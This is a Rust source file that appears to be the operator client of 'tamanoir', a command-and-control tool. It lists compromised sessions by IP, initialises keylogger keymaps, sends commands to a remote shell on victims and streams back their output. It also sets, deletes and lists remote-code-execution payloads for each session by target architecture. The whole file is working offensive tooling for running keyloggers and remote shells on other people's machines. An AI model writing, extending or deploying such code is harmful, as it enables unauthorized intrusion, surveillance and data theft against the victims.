use std::{
    collections::HashMap,
    net::Ipv4Addr,
    sync::{Arc, RwLock},
};

use tokio_stream::StreamExt;
use tonic::{transport::Channel, Request};

use crate::{
    app::{AppResult, SessionsMap},
    section::{
        keylogger::utils::init_keymaps,
        shell::{ShellCmd, ShellCmdHistory, ShellStdType},
    },
    tamanoir_grpc::{
        rce_client::RceClient, remote_shell_client::RemoteShellClient,
        session_client::SessionClient, DeleteSessionRceRequest, Empty, SessionRcePayload,
        SessionResponse, SetSessionRceRequest, ShellStd,
    },
};

#[derive(Debug, Clone)]
pub struct SessionServiceClient {
    pub client: SessionClient<Channel>,
}

#[derive(Debug, Clone)]
pub struct RemoteShellServiceClient {
    pub client: RemoteShellClient<Channel>,
}

#[derive(Debug, Clone)]
pub struct RceServiceClient {
    pub client: RceClient<Channel>,
}

impl SessionServiceClient {
    pub async fn new(ip: Ipv4Addr, port: u16) -> AppResult<Self> {
        let client = SessionClient::connect(format!("http://{}:{}", ip, port)).await?;
        init_keymaps();
        Ok(Self { client })
    }
    pub async fn list_sessions(&mut self) -> AppResult<Vec<SessionResponse>> {
        Ok(self
            .client
            .list_sessions(tonic::Request::new(Empty {}))
            .await?
            .into_inner()
            .sessions)
    }
}
impl RemoteShellServiceClient {
    pub async fn new(ip: Ipv4Addr, port: u16) -> AppResult<Self> {
        let client = RemoteShellClient::connect(format!("http://{}:{}", ip, port)).await?;
        Ok(Self { client })
    }
    pub async fn send_cmd(&mut self, cmd: String) -> AppResult<()> {
        let shell_msg = ShellStd {
            message: cmd.clone(),
        };
        let msg = Request::new(shell_msg);
        self.client.send_shell_std_in(msg).await?;
        Ok(())
    }
}

impl RceServiceClient {
    pub async fn new(ip: Ipv4Addr, port: u16) -> AppResult<Self> {
        let client = RceClient::connect(format!("http://{}:{}", ip, port)).await?;
        Ok(Self { client })
    }
    pub async fn set_session_rce(
        &mut self,
        session_id: String,
        rce: String,
        target_arch: String,
    ) -> AppResult<()> {
        let msg = SetSessionRceRequest {
            ip: session_id,
            rce,
            target_arch,
        };
        self.client.set_session_rce(msg).await?;
        Ok(())
    }
    pub async fn delete_session_rce(&mut self, session_id: String) -> AppResult<()> {
        self.client
            .delete_session_rce(DeleteSessionRceRequest { ip: session_id })
            .await?;
        Ok(())
    }
    pub async fn list_available_rce(&mut self) -> anyhow::Result<Vec<SessionRcePayload>> {
        let res = self
            .client
            .list_available_rce(Request::new(Empty {}))
            .await?;
        Ok(res.into_inner().rce_list)
    }
}
pub trait StreamReceiver<T> {
    fn listen(
        &mut self,
        update_object: Arc<RwLock<T>>,
    ) -> impl std::future::Future<Output = anyhow::Result<()>> + Send;
}

impl StreamReceiver<Vec<ShellCmd>> for RemoteShellServiceClient {
    async fn listen(&mut self, update_object: ShellCmdHistory) -> anyhow::Result<()> {
        let mut stream = self
            .client
            .watch_shell_std_out(Request::new(Empty {}))
            .await?
            .into_inner();
        while let Some(msg) = stream.next().await {
            update_object.write().unwrap().push(ShellCmd {
                inner: msg?.message,
                std_type: ShellStdType::StdOut,
            });
        }
        Ok(())
    }
}
impl StreamReceiver<HashMap<String, SessionResponse>> for SessionServiceClient {
    async fn listen(&mut self, update_object: SessionsMap) -> anyhow::Result<()> {
        let mut stream = self
            .client
            .watch_sessions(Request::new(Empty {}))
            .await?
            .into_inner();
        while let Some(msg) = stream.next().await {
            let msg = msg?;
            update_object.write().unwrap().insert(msg.ip.clone(), msg);
        }
        Ok(())
    }
}
